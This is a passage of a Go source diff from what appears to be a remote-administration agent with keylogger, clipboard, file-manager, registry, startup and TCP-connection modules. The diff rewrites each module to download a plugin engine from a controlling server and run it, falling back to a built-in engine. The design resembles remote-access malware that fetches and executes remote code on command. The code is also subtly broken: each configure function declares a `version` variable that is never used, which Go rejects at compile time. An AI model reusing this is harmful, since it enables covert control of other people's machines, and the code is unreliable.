-	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
+
+	version := strings.TrimSpace(result.Manifest.Version)
+	engine := audioengine.NewManagedAudioEngine(result.EntryPath, version, runtime.Logger)
+	return engine, version, nil
 }
 
-func (m *keyloggerModule) Shutdown(context.Context) error {
-	if m.manager != nil {
-		m.manager.Shutdown(context.Background())
-	}
-	return nil
-}
 
 type clipboardModule struct {
 	manager    *clipboard.Manager
@@ -974,10 +1400,16 @@ func (m *clipboardModule) Shutdown(context.Context) error {
 	return nil
 }
 
+type fileManagerEngineFactory func(context.Context, Config, filemanagerengine.Config) (filemanagerengine.Engine, string, error)
+
 type fileManagerModule struct {
-	manager    *filemanager.Manager
-	extensions *moduleExtensionState
-	extOnce    sync.Once
+	mu              sync.Mutex
+	engine          filemanagerengine.Engine
+	engineConfig    filemanagerengine.Config
+	factory         fileManagerEngineFactory
+	requiredVersion string
+	extensions      *moduleExtensionState
+	extOnce         sync.Once
 }
 
 func (m *fileManagerModule) Metadata() ModuleMetadata {
@@ -1029,7 +1461,11 @@ func (m *fileManagerModule) UnregisterExtension(source string) error {
 }
 
 func (m *fileManagerModule) configure(runtime Config) error {
-	cfg := filemanager.Config{
+	var requestTimeout time.Duration
+	if runtime.HTTPClient != nil {
+		requestTimeout = runtime.HTTPClient.Timeout
+	}
+	cfg := filemanagerengine.Config{
 		AgentID:   runtime.AgentID,
 		BaseURL:   runtime.BaseURL,
 		AuthKey:   runtime.AuthKey,
@@ -1037,16 +1473,47 @@ func (m *fileManagerModule) configure(runtime Config) error {
 		Logger:    runtime.Logger,
 		UserAgent: runtime.UserAgent,
 	}
-	if m.manager == nil {
-		m.manager = filemanager.NewManager(cfg)
+
+	m.mu.Lock()
+	factory := m.factory
+	engine := m.engine
+	version := strings.TrimSpace(m.requiredVersion)
+	m.mu.Unlock()
+
+	if engine == nil {
+		if factory == nil {
+			factory = defaultFileManagerEngineFactory
+		}
+		created, stagedVersion, err := factory(context.Background(), runtime, cfg)
+		if err != nil {
+			return err
+		}
+		stagedVersion = strings.TrimSpace(stagedVersion)
+		if err := created.Configure(cfg); err != nil {
+			return err
+		}
+		m.mu.Lock()
+		m.engine = created
+		m.engineConfig = cfg
+		if stagedVersion != "" {
+			m.requiredVersion = stagedVersion
+		}
+		m.mu.Unlock()
 		return nil
 	}
-	m.manager.UpdateConfig(cfg)
+
+	if err := engine.Configure(cfg); err != nil {
+		return err
+	}
+	m.mu.Lock()
+	m.engineConfig = cfg
+	m.mu.Unlock()
 	return nil
 }
 
 func (m *fileManagerModule) Handle(ctx context.Context, cmd protocol.Command) error {
-	if m.manager == nil {
+	engine := m.currentEngine()
+	if engine == nil {
 		return WrapCommandResult(protocol.CommandResult{
 			CommandID:   cmd.ID,
 			Success:     false,
@@ -1056,7 +1523,7 @@ func (m *fileManagerModule) Handle(ctx context.Context, cmd protocol.Command) er
 	}
 	state := m.extensionState()
 	if len(cmd.Payload) > 0 {
-		var payload filemanager.FileManagerCommandPayload
+		var payload filemanagerengine.FileManagerCommandPayload
 		if err := json.Unmarshal(cmd.Payload, &payload); err == nil {
 			action := strings.TrimSpace(strings.ToLower(payload.Action))
 			switch action {
@@ -1071,11 +1538,77 @@ func (m *fileManagerModule) Handle(ctx context.Context, cmd protocol.Command) er
 			}
 		}
 	}
-	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
+	return WrapCommandResult(engine.HandleCommand(ctx, cmd))
 }
 
 func (m *fileManagerModule) Shutdown(context.Context) error {
+	engine := m.currentEngine()
+	if engine != nil {
+		engine.Shutdown()
+	}
 	return nil
+}
+
+func (m *fileManagerModule) currentEngine() filemanagerengine.Engine {
+	m.mu.Lock()
+	defer m.mu.Unlock()
+	return m.engine
+}
+
+func defaultFileManagerEngineFactory(ctx context.Context, runtime Config, cfg filemanagerengine.Config) (filemanagerengine.Engine, string, error) {
+	manager := runtime.Plugins
+	client := runtime.HTTPClient
+	baseURL := strings.TrimSpace(runtime.BaseURL)
+	agentID := strings.TrimSpace(runtime.AgentID)
+
+	fallback := func() (filemanagerengine.Engine, string, error) {
+		engine := filemanagerengine.NewFileManagerEngine(cfg)
+		return engine, "", nil
+	}
+
+	if manager == nil || client == nil || baseURL == "" || agentID == "" {
+		return fallback()
+	}
+
+	descriptor, ok := runtime.PluginManifests["filemanager-engine"]
+	if !ok {
+		return fallback()
+	}
+
+	stageCtx := ctx
+	if stageCtx == nil {
+		stageCtx = context.Background()
+	}
+
+	stageCtx, cancel := context.WithTimeout(stageCtx, 30*time.Second)
+	defer cancel()
+
+	var metadata protocol.AgentMetadata
+	if runtime.Provider != nil {
+		metadata = runtime.Provider.AgentMetadata()
+	}
+	agentVersion := strings.TrimSpace(runtime.BuildVersion)
+	if agentVersion == "" {
+		agentVersion = strings.TrimSpace(metadata.Version)
+	}
+	facts := manifest.RuntimeFacts{
+		Platform:       metadata.OS,
+		Architecture:   metadata.Architecture,
+		AgentVersion:   agentVersion,
+		EnabledModules: append([]string(nil), runtime.ActiveModules...),
+	}
+
+	result, err := plugins.StagePlugin(stageCtx, manager, client, baseURL, agentID, runtime.AuthKey, runtime.UserAgent, facts, descriptor, "filemanager-engine")
+	if err != nil {
+		if runtime.Logger != nil {
+			runtime.Logger.Printf("file-manager: engine staging failed: %v", err)
+		}
+		return fallback()
+	}
+
+	version := strings.TrimSpace(result.Manifest.Version)
+	engine := filemanagerengine.NewManagedFileManagerEngine(result.EntryPath, version, runtime.Logger)
+	return engine, version, nil
 }
 
 type environmentModule struct {
@@ -1161,19 +1694,22 @@ func (m *environmentModule) Handle(ctx context.Context, cmd protocol.Command) er
 
 func (m *environmentModule) Shutdown(context.Context) error { return nil }
 
+type triggerMonitorEngineFactory func(context.Context, Config, triggerengine.Config) (triggerengine.Engine, string, error)
+
 type triggerMonitorModule struct {
 	BaseModule
-	manager *triggermgr.Manager
+	mu              sync.Mutex
+	engine          triggerengine.Engine
+	engineConfig    triggerengine.Config
+	factory         triggerMonitorEngineFactory
+	requiredVersion string
 }
 
 func newTriggerMonitorModule() *triggerMonitorModule {
 	return &triggerMonitorModule{
 		BaseModule: *NewBaseModule("trigger-monitor", triggerMonitorModuleBaseCapabilities),
+		factory:    defaultTriggerMonitorEngineFactory,
 	}
-}
-
-type triggerCommandPayload struct {
-	Action string `json:"action"`
 }
 
 func (m *triggerMonitorModule) Metadata() ModuleMetadata {
@@ -1207,15 +1743,51 @@ func (m *triggerMonitorModule) UpdateConfig(cfg Config) error {
 	return m.configure(cfg)
 }
 
-func (m *triggerMonitorModule) configure(Config) error {
-	if m.manager == nil {
-		m.manager = triggermgr.NewManager()
+func (m *triggerMonitorModule) configure(cfg Config) error {
+	runtimeCfg := triggerengine.Config{
+		Logger: cfg.Logger,
 	}
+
+	m.mu.Lock()
+	factory := m.factory
+	engine := m.engine
+	version := strings.TrimSpace(m.requiredVersion)
+	m.mu.Unlock()
+
+	if engine == nil {
+		if factory == nil {
+			factory = defaultTriggerMonitorEngineFactory
+		}
+		created, stagedVersion, err := factory(context.Background(), cfg, runtimeCfg)
+		if err != nil {
+			return err
+		}
+		stagedVersion = strings.TrimSpace(stagedVersion)
+		if err := created.Configure(runtimeCfg); err != nil {
+			return err
+		}
+		m.mu.Lock()
+		m.engine = created
+		m.engineConfig = runtimeCfg
+		if stagedVersion != "" {
+			m.requiredVersion = stagedVersion
+		}
+		m.mu.Unlock()
+		return nil
+	}
+
+	if err := engine.Configure(runtimeCfg); err != nil {
+		return err
+	}
+	m.mu.Lock()
+	m.engineConfig = runtimeCfg
+	m.mu.Unlock()
 	return nil
 }
 
 func (m *triggerMonitorModule) Handle(ctx context.Context, cmd protocol.Command) error {
-	if m.manager == nil {
+	engine := m.currentEngine()
+	if engine == nil {
 		return WrapCommandResult(protocol.CommandResult{
 			CommandID:   cmd.ID,
 			Success:     false,
@@ -1223,8 +1795,9 @@ func (m *triggerMonitorModule) Handle(ctx context.Context, cmd protocol.Command)
 			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
 		})
 	}
+
 	if len(cmd.Payload) > 0 {
-		var payload triggerCommandPayload
+		var payload triggerengine.CommandPayload
 		if err := json.Unmarshal(cmd.Payload, &payload); err == nil {
 			action := strings.TrimSpace(strings.ToLower(payload.Action))
 			switch action {
@@ -1239,10 +1812,79 @@ func (m *triggerMonitorModule) Handle(ctx context.Context, cmd protocol.Command)
 			}
 		}
 	}
-	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
+
+	return WrapCommandResult(engine.HandleCommand(ctx, cmd))
 }
 
-func (m *triggerMonitorModule) Shutdown(context.Context) error { return nil }
+func (m *triggerMonitorModule) Shutdown(context.Context) error {
+	engine := m.currentEngine()
+	if engine != nil {
+		engine.Shutdown()
+	}
+	return nil
+}
+
+func (m *triggerMonitorModule) currentEngine() triggerengine.Engine {
+	m.mu.Lock()
+	defer m.mu.Unlock()
+	return m.engine
+}
+
+func defaultTriggerMonitorEngineFactory(ctx context.Context, runtime Config, cfg triggerengine.Config) (triggerengine.Engine, string, error) {
+	manager := runtime.Plugins
+	client := runtime.HTTPClient
+	baseURL := strings.TrimSpace(runtime.BaseURL)
+	agentID := strings.TrimSpace(runtime.AgentID)
+
+	fallback := func() (triggerengine.Engine, string, error) {
+		engine := triggerengine.NewTriggerEngine(cfg)
+		return engine, "", nil
+	}
+
+	if manager == nil || client == nil || baseURL == "" || agentID == "" {
+		return fallback()
+	}
+
+	descriptor, ok := runtime.PluginManifests["trigger-engine"]
+	if !ok {
+		return fallback()
+	}
+
+	stageCtx := ctx
+	if stageCtx == nil {
+		stageCtx = context.Background()
+	}
+
+	stageCtx, cancel := context.WithTimeout(stageCtx, 30*time.Second)
+	defer cancel()
+
+	var metadata protocol.AgentMetadata
+	if runtime.Provider != nil {
+		metadata = runtime.Provider.AgentMetadata()
+	}
+	agentVersion := strings.TrimSpace(runtime.BuildVersion)
+	if agentVersion == "" {
+		agentVersion = strings.TrimSpace(metadata.Version)
+	}
+	facts := manifest.RuntimeFacts{
+		Platform:       metadata.OS,
+		Architecture:   metadata.Architecture,
+		AgentVersion:   agentVersion,
+		EnabledModules: append([]string(nil), runtime.ActiveModules...),
+	}
+
+	result, err := plugins.StagePlugin(stageCtx, manager, client, baseURL, agentID, runtime.AuthKey, runtime.UserAgent, facts, descriptor, "trigger-engine")
+	if err != nil {
+		if runtime.Logger != nil {
+			runtime.Logger.Printf("trigger monitor: engine staging failed: %v", err)
+		}
+		return fallback()
+	}
+
+	version := strings.TrimSpace(result.Manifest.Version)
+	engine := triggerengine.NewManagedTriggerEngine(result.EntryPath, version, runtime.Logger)
+	return engine, version, nil
+}
 
 type geoModule struct {
 	BaseModule
@@ -1329,12 +1971,20 @@ func (m *geoModule) Handle(ctx context.Context, cmd protocol.Command) error {
 
 func (m *geoModule) Shutdown(context.Context) error { return nil }
 
+type registryEngineFactory func(context.Context, Config, registryengine.Config) (registryengine.Engine, string, error)
+
 type registryModule struct {
-	manager *registrymgr.Manager
+	mu              sync.Mutex
+	engine          registryengine.Engine
+	engineConfig    registryengine.Config
+	factory         registryEngineFactory
+	requiredVersion string
 }
 
 func newRegistryModule() *registryModule {
-	return &registryModule{}
+	return &registryModule{
+		factory: defaultRegistryEngineFactory,
+	}
 }
 
 func (m *registryModule) Metadata() ModuleMetadata {
@@ -1348,7 +1998,7 @@ func (m *registryModule) Metadata() ModuleMetadata {
 }
 
 func registryModuleCapabilities() []ModuleCapability {
-	profile := registrymgr.NativeCapabilities()
+	profile := registryengine.NativeCapabilities()
 	capabilities := make([]ModuleCapability, 0, 2)
 	if profile.Enumerate {
 		capabilities = append(capabilities, ModuleCapability{
@@ -1379,17 +2029,51 @@ func (m *registryModule) UpdateConfig(cfg Config) error {
 	return m.configure(cfg)
 }
 
-func (m *registryModule) configure(cfg Config) error {
-	if m.manager == nil {
-		m.manager = registrymgr.NewManager(cfg.Logger)
+func (m *registryModule) configure(runtime Config) error {
+	cfg := registryengine.Config{
+		Logger: runtime.Logger,
+	}
+
+	m.mu.Lock()
+	factory := m.factory
+	engine := m.engine
+	version := strings.TrimSpace(m.requiredVersion)
+	m.mu.Unlock()
+
+	if engine == nil {
+		if factory == nil {
+			factory = defaultRegistryEngineFactory
+		}
+		created, stagedVersion, err := factory(context.Background(), runtime, cfg)
+		if err != nil {
+			return err
+		}
+		stagedVersion = strings.TrimSpace(stagedVersion)
+		if err := created.Configure(cfg); err != nil {
+			return err
+		}
+		m.mu.Lock()
+		m.engine = created
+		m.engineConfig = cfg
+		if stagedVersion != "" {
+			m.requiredVersion = stagedVersion
+		}
+		m.mu.Unlock()
 		return nil
 	}
-	m.manager.UpdateLogger(cfg.Logger)
+
+	if err := engine.Configure(cfg); err != nil {
+		return err
+	}
+	m.mu.Lock()
+	m.engineConfig = cfg
+	m.mu.Unlock()
 	return nil
 }
 
 func (m *registryModule) Handle(ctx context.Context, cmd protocol.Command) error {
-	if m.manager == nil {
+	engine := m.currentEngine()
+	if engine == nil {
 		return WrapCommandResult(protocol.CommandResult{
 			CommandID:   cmd.ID,
 			Success:     false,
@@ -1397,19 +2081,93 @@ func (m *registryModule) Handle(ctx context.Context, cmd protocol.Command) error
 			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
 		})
 	}
-	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
+	return WrapCommandResult(engine.HandleCommand(ctx, cmd))
 }
 
 func (m *registryModule) Shutdown(context.Context) error {
+	engine := m.currentEngine()
+	if engine != nil {
+		engine.Shutdown()
+	}
 	return nil
 }
 
+func (m *registryModule) currentEngine() registryengine.Engine {
+	m.mu.Lock()
+	defer m.mu.Unlock()
+	return m.engine
+}
+
+func defaultRegistryEngineFactory(ctx context.Context, runtime Config, cfg registryengine.Config) (registryengine.Engine, string, error) {
+	manager := runtime.Plugins
+	client := runtime.HTTPClient
+	baseURL := strings.TrimSpace(runtime.BaseURL)
+	agentID := strings.TrimSpace(runtime.AgentID)
+
+	fallback := func() (registryengine.Engine, string, error) {
+		engine := registryengine.NewRegistryEngine(cfg)
+		return engine, "", nil
+	}
+
+	if manager == nil || client == nil || baseURL == "" || agentID == "" {
+		return fallback()
+	}
+
+	descriptor, ok := runtime.PluginManifests["registry-engine"]
+	if !ok {
+		return fallback()
+	}
+
+	stageCtx := ctx
+	if stageCtx == nil {
+		stageCtx = context.Background()
+	}
+
+	stageCtx, cancel := context.WithTimeout(stageCtx, 30*time.Second)
+	defer cancel()
+
+	var metadata protocol.AgentMetadata
+	if runtime.Provider != nil {
+		metadata = runtime.Provider.AgentMetadata()
+	}
+	agentVersion := strings.TrimSpace(runtime.BuildVersion)
+	if agentVersion == "" {
+		agentVersion = strings.TrimSpace(metadata.Version)
+	}
+	facts := manifest.RuntimeFacts{
+		Platform:       metadata.OS,
+		Architecture:   metadata.Architecture,
+		AgentVersion:   agentVersion,
+		EnabledModules: append([]string(nil), runtime.ActiveModules...),
+	}
+
+	result, err := plugins.StagePlugin(stageCtx, manager, client, baseURL, agentID, runtime.AuthKey, runtime.UserAgent, facts, descriptor, "registry-engine")
+	if err != nil {
+		if runtime.Logger != nil {
+			runtime.Logger.Printf("registry: engine staging failed: %v", err)
+		}
+		return fallback()
+	}
+
+	version := strings.TrimSpace(result.Manifest.Version)
+	engine := registryengine.NewManagedRegistryEngine(result.EntryPath, version, runtime.Logger)
+	return engine, version, nil
+}
+
+type startupEngineFactory func(context.Context, Config, startupengine.Config) (startupengine.Engine, string, error)
+
 type startupModule struct {
-	manager *startupmgr.Manager
+	mu              sync.Mutex
+	engine          startupengine.Engine
+	engineConfig    startupengine.Config
+	factory         startupEngineFactory
+	requiredVersion string
 }
 
 func newStartupModule() *startupModule {
-	return &startupModule{}
+	return &startupModule{
+		factory: defaultStartupEngineFactory,
+	}
 }
 
 func (m *startupModule) Metadata() ModuleMetadata {
@@ -1423,7 +2181,7 @@ func (m *startupModule) Metadata() ModuleMetadata {
 }
 
 func startupModuleCapabilities() []ModuleCapability {
-	profile := startupmgr.NativeCapabilities()
+	profile := startupengine.NativeCapabilities()
 	capabilities := make([]ModuleCapability, 0, 2)
 	if profile.Enumerate {
 		capabilities = append(capabilities, ModuleCapability{
@@ -1455,16 +2213,50 @@ func (m *startupModule) UpdateConfig(cfg Config) error {
 }
 
 func (m *startupModule) configure(cfg Config) error {
-	if m.manager == nil {
-		m.manager = startupmgr.NewManager(cfg.Logger)
+	runtimeCfg := startupengine.Config{
+		Logger: cfg.Logger,
+	}
+
+	m.mu.Lock()
+	factory := m.factory
+	engine := m.engine
+	version := strings.TrimSpace(m.requiredVersion)
+	m.mu.Unlock()
+
+	if engine == nil {
+		if factory == nil {
+			factory = defaultStartupEngineFactory
+		}
+		created, stagedVersion, err := factory(context.Background(), cfg, runtimeCfg)
+		if err != nil {
+			return err
+		}
+		stagedVersion = strings.TrimSpace(stagedVersion)
+		if err := created.Configure(runtimeCfg); err != nil {
+			return err
+		}
+		m.mu.Lock()
+		m.engine = created
+		m.engineConfig = runtimeCfg
+		if stagedVersion != "" {
+			m.requiredVersion = stagedVersion
+		}
+		m.mu.Unlock()
 		return nil
 	}
-	m.manager.UpdateLogger(cfg.Logger)
+
+	if err := engine.Configure(runtimeCfg); err != nil {
+		return err
+	}
+	m.mu.Lock()
+	m.engineConfig = runtimeCfg
+	m.mu.Unlock()
 	return nil
 }
 
 func (m *startupModule) Handle(ctx context.Context, cmd protocol.Command) error {
-	if m.manager == nil {
+	engine := m.currentEngine()
+	if engine == nil {
 		return WrapCommandResult(protocol.CommandResult{
 			CommandID:   cmd.ID,
 			Success:     false,
@@ -1472,17 +2264,89 @@ func (m *startupModule) Handle(ctx context.Context, cmd protocol.Command) error 
 			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
 		})
 	}
-	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
+	return WrapCommandResult(engine.HandleCommand(ctx, cmd))
 }
 
 func (m *startupModule) Shutdown(context.Context) error {
+	engine := m.currentEngine()
+	if engine != nil {
+		engine.Shutdown()
+	}
 	return nil
 }
 
+func (m *startupModule) currentEngine() startupengine.Engine {
+	m.mu.Lock()
+	defer m.mu.Unlock()
+	return m.engine
+}
+
+func defaultStartupEngineFactory(ctx context.Context, runtime Config, cfg startupengine.Config) (startupengine.Engine, string, error) {
+	manager := runtime.Plugins
+	client := runtime.HTTPClient
+	baseURL := strings.TrimSpace(runtime.BaseURL)
+	agentID := strings.TrimSpace(runtime.AgentID)
+
+	fallback := func() (startupengine.Engine, string, error) {
+		engine := startupengine.NewStartupEngine(cfg)
+		return engine, "", nil
+	}
+
+	if manager == nil || client == nil || baseURL == "" || agentID == "" {
+		return fallback()
+	}
+
+	descriptor, ok := runtime.PluginManifests["startup-engine"]
+	if !ok {
+		return fallback()
+	}
+
+	stageCtx := ctx
+	if stageCtx == nil {
+		stageCtx = context.Background()
+	}
+
+	stageCtx, cancel := context.WithTimeout(stageCtx, 30*time.Second)
+	defer cancel()
+
+	var metadata protocol.AgentMetadata
+	if runtime.Provider != nil {
+		metadata = runtime.Provider.AgentMetadata()
+	}
+	agentVersion := strings.TrimSpace(runtime.BuildVersion)
+	if agentVersion == "" {
+		agentVersion = strings.TrimSpace(metadata.Version)
+	}
+	facts := manifest.RuntimeFacts{
+		Platform:       metadata.OS,
+		Architecture:   metadata.Architecture,
+		AgentVersion:   agentVersion,
+		EnabledModules: append([]string(nil), runtime.ActiveModules...),
+	}
+
+	result, err := plugins.StagePlugin(stageCtx, manager, client, baseURL, agentID, runtime.AuthKey, runtime.UserAgent, facts, descriptor, "startup-engine")
+	if err != nil {
+		if runtime.Logger != nil {
+			runtime.Logger.Printf("startup: engine staging failed: %v", err)
+		}
+		return fallback()
+	}
+
+	version := strings.TrimSpace(result.Manifest.Version)
+	engine := startupengine.NewManagedStartupEngine(result.EntryPath, version, runtime.Logger)
+	return engine, version, nil
+}
+
+type taskManagerEngineFactory func(context.Context, Config, taskmanagerengine.Config) (taskmanagerengine.Engine, string, error)
+
 type taskManagerModule struct {
-	manager    *taskmanager.Manager
-	extensions *moduleExtensionState
-	extOnce    sync.Once
+	mu              sync.Mutex
+	engine          taskmanagerengine.Engine
+	engineConfig    taskmanagerengine.Config
+	factory         taskManagerEngineFactory
+	requiredVersion string
+	extensions      *moduleExtensionState
+	extOnce         sync.Once
 }
 
 func (m *taskManagerModule) Metadata() ModuleMetadata {
@@ -1534,16 +2398,50 @@ func (m *taskManagerModule) UnregisterExtension(source string) error {
 }
 
 func (m *taskManagerModule) configure(runtime Config) error {
-	if m.manager == nil {
-		m.manager = taskmanager.NewManager(runtime.Logger)
+	cfg := taskmanagerengine.Config{
+		Logger: runtime.Logger,
+	}
+
+	m.mu.Lock()
+	factory := m.factory
+	engine := m.engine
+	version := strings.TrimSpace(m.requiredVersion)
+	m.mu.Unlock()
+
+	if engine == nil {
+		if factory == nil {
+			factory = defaultTaskManagerEngineFactory
+		}
+		created, stagedVersion, err := factory(context.Background(), runtime, cfg)
+		if err != nil {
+			return err
+		}
+		stagedVersion = strings.TrimSpace(stagedVersion)
+		if err := created.Configure(cfg); err != nil {
+			return err
+		}
+		m.mu.Lock()
+		m.engine = created
+		m.engineConfig = cfg
+		if stagedVersion != "" {
+			m.requiredVersion = stagedVersion
+		}
+		m.mu.Unlock()
 		return nil
 	}
-	m.manager.UpdateLogger(runtime.Logger)
+
+	if err := engine.Configure(cfg); err != nil {
+		return err
+	}
+	m.mu.Lock()
+	m.engineConfig = cfg
+	m.mu.Unlock()
 	return nil
 }
 
 func (m *taskManagerModule) Handle(ctx context.Context, cmd protocol.Command) error {
-	if m.manager == nil {
+	engine := m.currentEngine()
+	if engine == nil {
 		return WrapCommandResult(protocol.CommandResult{
 			CommandID:   cmd.ID,
 			Success:     false,
@@ -1553,31 +2451,103 @@ func (m *taskManagerModule) Handle(ctx context.Context, cmd protocol.Command) er
 	}
 	state := m.extensionState()
 	if len(cmd.Payload) > 0 {
-		var payload taskmanager.TaskManagerCommandPayload
+		var payload taskmanagerengine.TaskManagerCommandPayload
 		if err := json.Unmarshal(cmd.Payload, &payload); err == nil {
 			switch payload.Request.Operation {
-			case taskmanager.OperationList, taskmanager.OperationDetail:
+			case taskmanagerengine.OperationList, taskmanagerengine.OperationDetail:
 				if !state.hasCapability("task-manager.list") {
 					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "task-manager.list"))
 				}
-			case taskmanager.OperationStart, taskmanager.OperationAction:
+			case taskmanagerengine.OperationStart, taskmanagerengine.OperationAction:
 				if !state.hasCapability("task-manager.control") {
 					return WrapCommandResult(capabilityUnavailableResult(cmd, m.ID(), "task-manager.control"))
 				}
 			}
 		}
 	}
-	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
+	return WrapCommandResult(engine.HandleCommand(ctx, cmd))
 }
 
 func (m *taskManagerModule) Shutdown(context.Context) error {
+	engine := m.currentEngine()
+	if engine != nil {
+		engine.Shutdown()
+	}
 	return nil
 }
 
+func (m *taskManagerModule) currentEngine() taskmanagerengine.Engine {
+	m.mu.Lock()
+	defer m.mu.Unlock()
+	return m.engine
+}
+
+func defaultTaskManagerEngineFactory(ctx context.Context, runtime Config, cfg taskmanagerengine.Config) (taskmanagerengine.Engine, string, error) {
+	manager := runtime.Plugins
+	client := runtime.HTTPClient
+	baseURL := strings.TrimSpace(runtime.BaseURL)
+	agentID := strings.TrimSpace(runtime.AgentID)
+
+	fallback := func() (taskmanagerengine.Engine, string, error) {
+		engine := taskmanagerengine.NewTaskManagerEngine(cfg)
+		return engine, "", nil
+	}
+
+	if manager == nil || client == nil || baseURL == "" || agentID == "" {
+		return fallback()
+	}
+
+	descriptor, ok := runtime.PluginManifests["taskmanager-engine"]
+	if !ok {
+		return fallback()
+	}
+
+	stageCtx := ctx
+	if stageCtx == nil {
+		stageCtx = context.Background()
+	}
+
+	stageCtx, cancel := context.WithTimeout(stageCtx, 30*time.Second)
+	defer cancel()
+
+	var metadata protocol.AgentMetadata
+	if runtime.Provider != nil {
+		metadata = runtime.Provider.AgentMetadata()
+	}
+	agentVersion := strings.TrimSpace(runtime.BuildVersion)
+	if agentVersion == "" {
+		agentVersion = strings.TrimSpace(metadata.Version)
+	}
+	facts := manifest.RuntimeFacts{
+		Platform:       metadata.OS,
+		Architecture:   metadata.Architecture,
+		AgentVersion:   agentVersion,
+		EnabledModules: append([]string(nil), runtime.ActiveModules...),
+	}
+
+	result, err := plugins.StagePlugin(stageCtx, manager, client, baseURL, agentID, runtime.AuthKey, runtime.UserAgent, facts, descriptor, "taskmanager-engine")
+	if err != nil {
+		if runtime.Logger != nil {
+			runtime.Logger.Printf("task-manager: engine staging failed: %v", err)
+		}
+		return fallback()
+	}
+
+	version := strings.TrimSpace(result.Manifest.Version)
+	engine := taskmanagerengine.NewManagedTaskManagerEngine(result.EntryPath, version, runtime.Logger)
+	return engine, version, nil
+}
+
+type tcpConnectionsEngineFactory func(context.Context, Config, tcpconnectionsengine.Config) (tcpconnectionsengine.Engine, string, error)
+
 type tcpConnectionsModule struct {
-	manager    *tcpconnections.Manager
-	extensions *moduleExtensionState
-	extOnce    sync.Once
+	mu              sync.Mutex
+	engine          tcpconnectionsengine.Engine
+	engineConfig    tcpconnectionsengine.Config
+	factory         tcpConnectionsEngineFactory
+	requiredVersion string
+	extensions      *moduleExtensionState
+	extOnce         sync.Once
 }
 
 func (m *tcpConnectionsModule) Metadata() ModuleMetadata {
@@ -1629,7 +2599,11 @@ func (m *tcpConnectionsModule) UnregisterExtension(source string) error {
 }
 
 func (m *tcpConnectionsModule) configure(runtime Config) error {
-	cfg := tcpconnections.Config{
+	var requestTimeout time.Duration
+	if runtime.HTTPClient != nil {
+		requestTimeout = runtime.HTTPClient.Timeout
+	}
+	cfg := tcpconnectionsengine.Config{
 		AgentID:   runtime.AgentID,
 		BaseURL:   runtime.BaseURL,
 		AuthKey:   runtime.AuthKey,
@@ -1637,16 +2611,47 @@ func (m *tcpConnectionsModule) configure(runtime Config) error {
 		Logger:    runtime.Logger,
 		UserAgent: runtime.UserAgent,
 	}
-	if m.manager == nil {
-		m.manager = tcpconnections.NewManager(cfg)
+
+	m.mu.Lock()
+	factory := m.factory
+	engine := m.engine
+	version := strings.TrimSpace(m.requiredVersion)
+	m.mu.Unlock()
+
+	if engine == nil {
+		if factory == nil {
+			factory = defaultTcpConnectionsEngineFactory
+		}
+		created, stagedVersion, err := factory(context.Background(), runtime, cfg)
+		if err != nil {
+			return err
+		}
+		stagedVersion = strings.TrimSpace(stagedVersion)
+		if err := created.Configure(cfg); err != nil {
+			return err
+		}
+		m.mu.Lock()
+		m.engine = created
+		m.engineConfig = cfg
+		if stagedVersion != "" {
+			m.requiredVersion = stagedVersion
+		}
+		m.mu.Unlock()
 		return nil
 	}
-	m.manager.UpdateConfig(cfg)
+
+	if err := engine.Configure(cfg); err != nil {
+		return err
+	}
+	m.mu.Lock()
+	m.engineConfig = cfg
+	m.mu.Unlock()
 	return nil
 }
 
 func (m *tcpConnectionsModule) Handle(ctx context.Context, cmd protocol.Command) error {
-	if m.manager == nil {
+	engine := m.currentEngine()
+	if engine == nil {
 		return WrapCommandResult(protocol.CommandResult{
 			CommandID:   cmd.ID,
 			Success:     false,
@@ -1656,7 +2661,7 @@ func (m *tcpConnectionsModule) Handle(ctx context.Context, cmd protocol.Command)
 	}
 	state := m.extensionState()
 	if len(cmd.Payload) > 0 {
-		var payload tcpconnections.TcpConnectionsCommandPayload
+		var payload tcpconnectionsengine.TcpConnectionsCommandPayload
 		if err := json.Unmarshal(cmd.Payload, &payload); err == nil {
 			action := strings.TrimSpace(strings.ToLower(payload.Action))
 			if action == "enumerate" || action == "" {
@@ -1670,11 +2675,77 @@ func (m *tcpConnectionsModule) Handle(ctx context.Context, cmd protocol.Command)
 			}
 		}
 	}
-	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
+	return WrapCommandResult(engine.HandleCommand(ctx, cmd))
 }
 
 func (m *tcpConnectionsModule) Shutdown(context.Context) error {
+	engine := m.currentEngine()
+	if engine != nil {
+		engine.Shutdown()
+	}
 	return nil
+}
+
+func (m *tcpConnectionsModule) currentEngine() tcpconnectionsengine.Engine {
+	m.mu.Lock()
+	defer m.mu.Unlock()
+	return m.engine
+}
+
+func defaultTcpConnectionsEngineFactory(ctx context.Context, runtime Config, cfg tcpconnectionsengine.Config) (tcpconnectionsengine.Engine, string, error) {
+	manager := runtime.Plugins
+	client := runtime.HTTPClient
+	baseURL := strings.TrimSpace(runtime.BaseURL)
+	agentID := strings.TrimSpace(runtime.AgentID)
+
+	fallback := func() (tcpconnectionsengine.Engine, string, error) {
+		engine := tcpconnectionsengine.NewTcpConnectionsEngine(cfg)
+		return engine, "", nil
+	}
+
+	if manager == nil || client == nil || baseURL == "" || agentID == "" {
+		return fallback()
+	}
+
+	descriptor, ok := runtime.PluginManifests["tcpconnections-engine"]
+	if !ok {
+		return fallback()
+	}
+
+	stageCtx := ctx
+	if stageCtx == nil {
+		stageCtx = context.Background()
+	}
+
+	stageCtx, cancel := context.WithTimeout(stageCtx, 30*time.Second)
+	defer cancel()
+
+	var metadata protocol.AgentMetadata
+	if runtime.Provider != nil {
+		metadata = runtime.Provider.AgentMetadata()
+	}
+	agentVersion := strings.TrimSpace(runtime.BuildVersion)
+	if agentVersion == "" {
+		agentVersion = strings.TrimSpace(metadata.Version)
+	}
+	facts := manifest.RuntimeFacts{
+		Platform:       metadata.OS,
+		Architecture:   metadata.Architecture,
+		AgentVersion:   agentVersion,
+		EnabledModules: append([]string(nil), runtime.ActiveModules...),
+	}
+
